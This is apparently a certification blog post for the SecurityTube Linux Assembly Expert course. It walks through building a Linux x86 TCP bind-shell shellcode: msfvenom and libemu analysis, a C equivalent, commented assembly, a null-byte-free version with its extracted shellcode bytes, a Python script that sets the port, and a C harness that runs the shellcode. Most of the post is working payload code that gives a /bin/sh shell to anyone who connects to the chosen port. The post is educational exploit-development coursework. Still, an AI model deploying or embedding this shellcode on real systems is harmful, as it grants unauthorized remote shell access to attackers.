# Assignment 1

* Create a Shell_Bind_TCP shellcode
  * Binds to a port
  * Execs shell on incoming connections
* Port number should be easily configurable

## Execution

The first thing that I wanted to do was to analyze the internals of an already implemented bind shell to understand the syscalls involved. For this task, Libemu was used; let's generate the shellcode and pipe it into sctest.

```
> msfvenom -p linux/x86/shell_bind_tcp LPORT=1234 -f raw -a x86 | sctest -vvv -G bind_shell_flow.dot -Ss 10000
> dot -Tpng bind_shell_flow.dot -o bind_shell_flow.png
```

The following figure shows graphically the flow of the bind shell generated.

<p align="center">
	<img width="50%" height="50%" src="bind_shell_flow.png"/>
</p>

Now that the functions used are known in details, I wanted to recreate the payload from msfvenom in C. This step is not really required, but it acts as a verification of my understanding. The following is the PoC in C.

```c
// Author   :  Alessio Parzian
// Filename :  bind_shell.c

// Compile with:
//     gcc bind_shell.c -o bind_shell

#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main()
{
	// Create the socket (man socket)
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	// 0 leaves it up to the service provider for protocol, which will be TCP
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);

	// Create sockaddr_in struct (man 7 ip)
	struct sockaddr_in host_addr;

	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	
	// Set port number to 1234, set to network byte order by htons
	host_addr.sin_port = htons(1234);

	// Listen on any interface
	host_addr.sin_addr.s_addr = INADDR_ANY;
	
	// Bind address to socket (man bind)
	bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));

	// Use the created socket to listen for connections (man listen)
	listen(host_sock, 0);

	// Accept connections, (man 2 accept) use NULLs to not store connection information from peer
	int client_sock = accept(host_sock, NULL, NULL);

	// Redirect stdin to client
	dup2(client_sock, 0);
	
	// Redirect stdout to client
	dup2(client_sock, 1);

	// Redirect stderr to client
	dup2(client_sock, 2);

	// Execute /bin/sh (man execve)
	execve("/bin/sh", NULL, NULL);

}
```

It looks to work! It's time to dive into the actual implementation in Assembly. 
The keypoints while writing the following piece of code are:

* Syscalls are called using the opcode *0x80* and the related involved registers have to be set accordingly
* Syscalls numbers are located at */usr/include/i386-linux-gnu/asm/unistd_32.h*
* The use of man 2 is fundamental
* The use of *gdb* to verify the state of the registers while the binary is in execution is crucial

```
; Author :  Alessio Parzian
; Filename: bind_shell.asm

; compile with:
; 	nasm -f elf32 bind_shell.asm
;	ld -o bind_shell bind_shell.o
; extract shellcode with:
; 	objdump -d bind_shell | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

    _start:
	    ;
        ; Syscall numbers for x86 can be found: /usr/include/i386-linux-gnu/asm/unistd_32.h
        ;
        ; ==================
        ; prepare registries
        ; ==================
        mov ebp,esp     ; zeroing register
        xor eax,eax     ; zeroing register
        xor ebx,ebx     ; zeroing register
        xor ecx,ecx     ; zeroing register
        xor edx,edx     ; zeroing register
        xor esi,esi     ; zeroing register
        ; ==================
        ; socket syscall
        ; ==================
        ; > man 2 socket 
        ; int socket(int domain, int type, int protocol);
        ; 	AF_INET is defined as 2 as listed in /usr/include/asm-generic/socket.h
        ; 	SOCK_STREAM is defined as 1 as listed in /usr/include/asm-generic/socket.h
        ; ------------------
        mov ax, 0x167   ; syscall number
        mov bl, 0x2     ; AF_INET - IPv4 Internet protocols
        mov cl, 0x1     ; SOCK_STREAM - Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.
                        ; edx is left to 0 as no additional flag is required to be set for our goal
        int 0x80        ; interrupt to ask for syscall execution
        mov esi, eax    ; save socket file descriptor to ESI register
        ; ==================
        ; bind syscall
        ; ==================
        ; > man 2 bind
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        ;	/usr/include/netinet/in.h
        ;	struct sockaddr_in {
        ;    	short            sin_family;   // e.g. AF_INET
        ;    	unsigned short   sin_port;     // e.g. htons(3490)
        ;    	struct in_addr   sin_addr;     // see struct in_addr, below
        ;    	char             sin_zero[8];  // zero this if you want to
        ;	};
        ;	struct in_addr {
        ;    	unsigned long s_addr;  // load with inet_aton()
        ;	};
        ; ------------------
        mov ax, 0x169    ; syscall number
        mov ebx, esi     ; move file descriptor previously created as parameter 
                         ; prepare struct sockaddr_in the stack 
        push edx         ; uint32_t s_addr bind (4 bytes) is left to 0x00000000, that means bind to 0.0.0.0 i.e. any interface
        push word 0x901f ; in_port_t sin_port (2 bytes) in little endian, 0x1f90 is 8080 
        push word 0x02   ; sa_family_t sin_family (2 bytes), AF_INET - IPv4 Internet protocols
        mov ecx, esp     ; move the address of esp as syscall parameter as a mean to access the struct just saved in the stack
        mov edx, 0x10    ; socklen_t addrlen (16 bytes) is the size of the struct saved  
        int 0x80         ; interrupt to ask for syscall execution
        ; ==================
        ; listen syscall
        ; ==================
        ; > man 2 listen
        ; int listen(int sockfd, int backlog);
        ; ------------------
        mov ax, 0x16b    ; syscall number
        mov ebx, esi     ; move file descriptor previously created as parameter 
        mov cl, 0x0      ; maximum length to which the queue of pending connections for sockfd may grow
        int 0x80         ; interrupt to ask for syscall execution
        ; ==================
        ; accept syscall
        ; ==================
        ; > man 2 accept4
        ; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
        ; refer to bind syscall for insights about sockaddr struct
        ; ------------------
        mov ax, 0x16c    ; syscall number, accept4 (man 2 accept)
        mov ebx, esi     ; move file descriptor previously created as parameter 
        xor edx, edx     ; zeroing register
        push edx         ; preparing enough space in the stack for struct sockaddr_in
        push edx         ; preparing enough space in the stack for struct sockaddr_in
        mov ecx, esp     ; move the address of esp as syscall parameter as a mean to access the empty struct just saved in the stack
        push 0x2         ; push on the stack the size (in bytes) of the structure pointed
        mov edx, esp     ; move the address of esp as syscall perameter as a mean to access the struct size just saved in the stack
        mov esi, 0x0     ; flags set to 0 for ensuring normal behavior
        int 0x80         ; interrupt to ask for syscall execution
        ; ==================
        ; dup2 syscall
        ; ==================
        ; > man 2 dup2
        ; int dup2(int oldfd, int newfd);
        ; ------------------
        mov ebx, eax	 ; move the file descriptor for the accepted socket as parameter
        xor ecx, ecx	 ; zeroing register
        mov cl, 0x3      ; set counter for loop, three loops are executed for stdin, stdout, stderr
        dupin:
            xor eax, eax ; zeroing out eax
            mov al, 0x3f ; syscall number - dup2
            dec cl       ; decreasing loop counter 
            int 0x80     ; interrupt to ask for syscall execution
            jnz dupin    ; if the zero flag is not set then do it again
        ; ==================
        ; execve syscall
        ; ==================
        ; > man 2 execve
        ;  int execve(const char *filename, char *const argv[], char *const envp[]);
        ; ------------------
        xor eax, eax	 ; zeroing out eax
        push eax         ; push null byte onto the stack
        mov al, 0x0b	 ; syscall number 
        push 0x68732f6e  ; push on the stack the name of the program, /bin/sh to executed in little endian - hs/n
        push 0x69622f2f  ; push on the stack the name of the program, /bin/sh to executed in little endian - ib// (double / for padding)
        mov ebx, esp	 ; move the address of esp as syscall perameter as a mean to access the program name
        push 0x00000000  ; push on the stack a null argv
        mov edx, esp	 ; move the address of esp as syscall perameter as a mean to access the argv value
        push ebx         ; push "//bin/sh,0x00000000" back to the stack as envp 
        mov  ecx, esp    ; move the address of esp as syscall perameter as a mean to access the envp value
        int 0x80         ; interrupt to ask for syscall execution
```

Once compiled the shellcode generated is the following:

```
\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66\x68\x1f\x90\x66\x6a\x02\x89\xe1\xba\x10\x00\x00\x00\xcd\x80\x66\xb8\x6b\x01\x89\xf3\xb1\x00\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\xbe\x00\x00\x00\x00\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x6a\x00\x89\xe2\x53\x89\xe1\xcd\x80
```

Many null bytes (\x00) are present in this shellcode and thus its execution might fail in a real world exploitation. Let's try to change the code with the  goal of avoiding null bytes.

```
; Author :  Alessio Parzian
; Filename: bind_shell_withNoNullbytes.asm

; compile with:
; 	nasm -f elf32 bind_shell_withNoNullbytes.asm
;	ld -o bind_shell bind_shell_withNoNullbytes.o
; extract shellcode with:
; 	objdump -d bind_shell | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

    _start:
        ;
        ; Syscall numbers for x86 can be found: /usr/include/i386-linux-gnu/asm/unistd_32.h
        ;
        ; ==================
        ; prepare registries
        ; ==================
        mov ebp,esp      ; zeroing register
        xor eax,eax      ; zeroing register
        xor ebx,ebx      ; zeroing register
        xor ecx,ecx      ; zeroing register
        xor edx,edx      ; zeroing register
        xor esi,esi      ; zeroing register
        ; ==================
        ; socket syscall
        ; ==================
        ; > man 2 socket 
        ; int socket(int domain, int type, int protocol);
        ; 	AF_INET is defined as 2 as listed in /usr/include/asm-generic/socket.h
        ; 	SOCK_STREAM is defined as 1 as listed in /usr/include/asm-generic/socket.h
        ; ------------------
        mov ax, 0x167    ; syscall number
        mov bl, 0x2      ; AF_INET - IPv4 Internet protocols
        mov cl, 0x1      ; SOCK_STREAM - Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.
                         ; edx is left to 0 as no additional flag is required to be set for our goal
        int 0x80         ; interrupt to ask for syscall execution
        mov esi, eax     ; save socket file descriptor to ESI register
        ; ==================
        ; bind syscall
        ; ==================
        ; > man 2 bind
        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        ;	/usr/include/netinet/in.h
        ;	struct sockaddr_in {
        ;    	short            sin_family;   // e.g. AF_INET
        ;    	unsigned short   sin_port;     // e.g. htons(3490)
        ;    	struct in_addr   sin_addr;     // see struct in_addr, below
        ;    	char             sin_zero[8];  // zero this if you want to
        ;	};
        ;	struct in_addr {
        ;    	unsigned long s_addr;  // load with inet_aton()
        ;	};
        ; ------------------
        mov ax, 0x169    ; syscall number
        mov ebx, esi     ; move file descriptor previously created as parameter 
                         ; prepare struct sockaddr_in the stack 
        push edx         ; uint32_t s_addr bind (4 bytes) is left to 0x00000000, that means bind to 0.0.0.0 i.e. any interface
        push word 0x901f ; in_port_t sin_port (2 bytes) in little endian, 0x1f90 is 8080 
        push word 0x02   ; sa_family_t sin_family (2 bytes), AF_INET - IPv4 Internet protocols
        mov ecx, esp     ; move the address of esp as syscall parameter as a mean to access the struct just saved in the stack
        xor edx, edx     ; zeroing register
        add edx, 0x10    ; socklen_t addrlen (16 bytes) is the size of the struct saved  
        int 0x80         ; interrupt to ask for syscall execution
        ; ==================
        ; listen syscall
        ; ==================
        ; > man 2 listen
        ; int listen(int sockfd, int backlog);
        ; ------------------
        mov ax, 0x16b    ; syscall number
        mov ebx, esi     ; move file descriptor previously created as parameter 
        xor ecx, ecx     ; maximum length to which the queue of pending connections for sockfd may grow
        int 0x80         ; interrupt to ask for syscall execution
        ; ==================
        ; accept syscall
        ; ==================
        ; > man 2 accept4
        ; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
        ; refer to bind syscall for insights about sockaddr struct
        ; ------------------
        mov ax, 0x16c    ; syscall number, accept4 (man 2 accept)
        mov ebx, esi     ; move file descriptor previously created as parameter 
        xor edx, edx     ; zeroing register
        push edx         ; preparing enough space in the stack for struct sockaddr_in
        push edx         ; preparing enough space in the stack for struct sockaddr_in
        mov ecx, esp     ; move the address of esp as syscall parameter as a mean to access the empty struct just saved in the stack
        push 0x2         ; push on the stack the size (in bytes) of the structure pointed
        mov edx, esp     ; move the address of esp as syscall perameter as a mean to access the struct size just saved in the stack
        xor esi, esi     ; flags set to 0 for ensuring normal behavior
        int 0x80         ; interrupt to ask for syscall execution
        ; ==================
        ; dup2 syscall
        ; ==================
        ; > man 2 dup2
        ; int dup2(int oldfd, int newfd);
        ; ------------------
        mov ebx, eax     ; move the file descriptor for the accepted socket as parameter
        xor ecx, ecx     ; zeroing register
        mov cl, 0x3      ; set counter for loop, three loops are executed for stdin, stdout, stderr
        dupin:
            xor eax, eax ; zeroing out eax
            mov al, 0x3f ; syscall number - dup2
            dec cl       ; decreasing loop counter 
            int 0x80     ; interrupt to ask for syscall execution
            jnz dupin    ; if the zero flag is not set then do it again
        ; ==================
        ; execve syscall
        ; ==================
        ; > man 2 execve
        ;  int execve(const char *filename, char *const argv[], char *const envp[]);
        ; ------------------
        xor eax, eax     ; zeroing out eax
        push eax         ; push null byte onto the stack
        mov al, 0x0b     ; syscall number 
        push 0x68732f6e  ; push on the stack the name of the program, /bin/sh to executed in little endian - hs/n
        push 0x69622f2f  ; push on the stack the name of the program, /bin/sh to executed in little endian - ib// (double / for padding)
        mov ebx, esp     ; move the address of esp as syscall perameter as a mean to access the program name
        xor edi, edi     ; zeroing register
        push edi         ; push on the stack a null argv
        mov edx, esp     ; move the address of esp as syscall perameter as a mean to access the argv value
        push ebx         ; push "//bin/sh,0x00000000" back to the stack as envp 
        mov  ecx, esp    ; move the address of esp as syscall perameter as a mean to access the envp value
        int 0x80         ; interrupt to ask for syscall execution
```

Once compiled the shellcode generated is the following, no null bytes are there!

```
\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff\x57\x89\xe2\x53\x89\xe1\xcd\x80
```

Let's move to the final part of the assignment: the port should be easily configurable. For doing this a Python helper script was implemented.

```python
#!/bin/python

# Author  : Alessio Parzian
# Filename: ShellGen.py
# Usage: python ShellGen.py $portnumber

# This script is an helper to easily configure the port of the bind shell

import sys

try:
	port = "{:04x}".format(int(sys.argv[1]))
	port_hex = port
	port = "\\x"+port[:2]+"\\x"+port[2:]

	shellcode = ("\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\xb8\\x67\\x01"
			     "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x66\\xb8\\x69\\x01\\x89\\xf3\\x52\\x66"
			     "\\x68"+port+"\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\x83\\xc2\\x10\\xcd\\x80\\x66"
			     "\\xb8\\x6b\\x01\\x89\\xf3\\x31\\xc9\\xcd\\x80\\x66\\xb8\\x6c\\x01\\x89\\xf3\\x31"
			     "\\xd2\\x52\\x52\\x89\\xe1\\x6a\\x02\\x89\\xe2\\x31\\xf6\\xcd\\x80\\x89\\xc3\\x31"
			     "\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x50"
			     "\\xb0\\x0b\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x31\\xff"
			     "\\x57\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80");
	
	print "[*] Shellcode will listen at port {}, which in hex is {}".format(sys.argv[1], port_hex)
	print "[*] Size: {0} bytes".format(shellcode.count("x"))
	print
	print "[*] Spawing..."
	print
	print shellcode
	
except Exception, e:
	print str(e)
	print 'Please specify port number as parameter in decimal format.\\n'
	print 'Usage:'
	print '	python ShellGen.py $port_number'
	exit(-1)
```

An example of output is the following:

```
> python ShellGen.py 9876

[*] Shellcode will listen at port 9876, which in hex is 2694
[*] Size: 120 bytes

[*] Spawing...

\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66\x68\x26\x94\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff\x57\x89\xe2\x53\x89\xe1\xcd\x80
```

For testing the shellcode generated the following helper program was used.

```c
/*
// Author: Alessio Parzian
// Filename: test_shell.c
//
// Test your shellcode. Replace shellcode variable value with your own shell, compile and execute.
// Compile with:
// 	gcc $file_name -fno-stack-protector -z execstack -o $out_name
*/

#include <stdio.h>

// Use an array instead of a pointer because the compiler does consider the array as mutable (this implies you can modify it at runtime). For pointers to literal this is not the case unless specific flag is passed to the compiler. This is very important when modifing at runtime the shellcode.

unsigned char shellcode[] = "\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66\x68\x26\x94\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff\x57\x89\xe2\x53\x89\xe1\xcd\x80";

int main (){
	void (*shell)(void) = (void(*)(void)) shellcode;
	shell();
}
```

Well, this concludes assignment 1!

<br/>

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.*

<http://securitytube-training.com/online-courses/security-tube-linux-assembly-expert>

*Student-ID: PA-8733*